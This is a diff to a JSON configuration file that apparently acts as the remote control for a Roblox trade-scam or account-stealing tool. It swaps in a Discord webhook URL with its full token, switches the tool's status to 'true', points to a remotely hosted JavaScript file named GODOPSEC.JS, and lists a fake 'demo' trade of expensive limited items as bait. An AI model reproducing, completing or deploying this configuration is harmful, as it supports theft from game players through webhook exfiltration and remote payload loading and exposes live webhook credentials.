@@ -1,4 +1,40 @@
 {
-  "webhook_error": "https://discord.com/api/webhooks/1510329805252595723/uc5okysugd7Ug8j1wrv_LbxgcLEpgOEuMD3SRQ9vcbyp7DHvmhaQEHlFSvpPpgVwGIla",
-  "status": false
+  "webhook_error": "https://discord.com/api/webhooks/1510328199924551851/VptZqLFwYBst75lCPn52tWoY41wKYX-H8-rHnbiH6zj_lbqBBZMUhnkp3txfgVeeYKsR",
+  "status": true,
+  "trade_demo_url": "https://raw.githubusercontent.com/GODOPSECXDXDXD/godopsec/refs/heads/main/GODOPSEC.JS",
+  "trade_config": {
+  "partner": { "id": 465771760, "name": "itemnebulous", "displayName": "Daitroks" },
+  "demoId": 2847293012,
+  "demoAssets": {
+    "receiveItems": [
+      {
+        "assetId": 158380697314856,
+        "itemType": "Bundle",
+        "name": "Super Super Happy Face",
+        "recentAveragePrice": 100000,
+        "userAssetId": 12388
+      },
+      {
+        "assetId": 628771505,
+        "itemType": "Asset",
+        "name": "Black Iron Horns",
+        "recentAveragePrice": 170000,
+        "userAssetId": 233
+      },
+      {
+        "assetId": 1744060292,
+        "itemType": "Asset",
+        "name": "Poisoned Horns of the Toxic Wasteland",
+        "recentAveragePrice": 1650000
+      }
+    ],
+    "rareHat": {
+      "assetId": 14463095,
+      "itemType": "Asset",
+      "name": "Pinstripe Fedora",
+      "recentAveragePrice": 12000
+    }
+  }
+}
+
 }
